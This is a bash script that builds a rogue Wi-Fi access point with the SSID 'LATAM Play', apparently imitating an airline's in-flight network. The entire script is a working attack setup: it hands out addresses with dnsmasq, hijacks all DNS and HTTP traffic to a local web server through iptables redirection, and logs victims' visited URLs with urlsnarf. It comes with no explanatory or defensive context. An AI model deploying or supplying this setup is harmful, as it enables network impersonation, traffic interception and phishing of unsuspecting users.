#!/bin/bash

#upstream="wlan0"
phy="wlan0"

echo "[+] Configure iptables and iface"
ifconfig $phy 10.0.0.1/24 up
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -F
#iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
#iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
iptables -P FORWARD DROP

sleep 1
echo "[+] Start HTTP server..."
systemctl start httpd
sleep 2

echo "[+] Creating dnsmasq config"
cat << EOF > dnsmasq.conf
interface=$phy
listen-address=10.0.0.1
dhcp-range=10.0.0.100,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
EOF
sleep 1

echo "[+] Creating hostapd config"
cat << EOF > hostapd.conf
interface=$phy
driver=nl80211
ssid=LATAM Play
channel=6
EOF
sleep 1

echo "[+] Starting dnsmasq..."
dnsmasq -C dnsmasq.conf -d &
sleep 3
echo "[+] Starting hostapd..."
hostapd hostapd.conf &
sleep 3
urlsnarf -i $phy &
echo "[!] press enter for kill"

read

killall dnsmasq
killall hostapd
killall urlsnarf
systemctl stop httpd
echo "[-] Exit"
